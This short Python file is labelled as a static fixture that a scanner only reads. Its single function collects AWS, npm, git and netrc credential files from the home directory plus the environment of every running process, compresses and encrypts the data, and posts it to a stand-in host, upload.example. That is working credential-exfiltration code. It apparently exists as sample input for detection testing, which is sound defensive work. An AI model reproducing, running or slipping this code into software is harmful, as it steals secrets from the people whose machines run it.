# Static fixture. Never import or execute: the runner only scans its bytes.
import gzip
import json
from pathlib import Path
import requests
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from configuration import PUBLIC_KEY

def bundle():
    records = {}
    base = Path.home()
    for name in ('.aws/credentials', '.npmrc', '.git-credentials', '.netrc'):
        item = base / name
        if item.is_file():
            records[name] = item.read_text(errors='ignore')
    for process_file in Path('/proc').glob('[0-9]*/environ'):
        try:
            records[str(process_file)] = process_file.read_bytes().decode(errors='ignore')
        except OSError:
            pass
    serialized = gzip.compress(json.dumps(records).encode())
    secret_key = get_random_bytes(32)
    vector = get_random_bytes(16)
    encryptor = AES.new(secret_key, AES.MODE_CBC, vector)
    ciphertext = encryptor.encrypt(pad(serialized, AES.block_size))
    envelope = PKCS1_OAEP.new(RSA.import_key(PUBLIC_KEY)).encrypt(secret_key)
    result = requests.post('https://upload.example/ingest', data=envelope + vector + ciphertext)
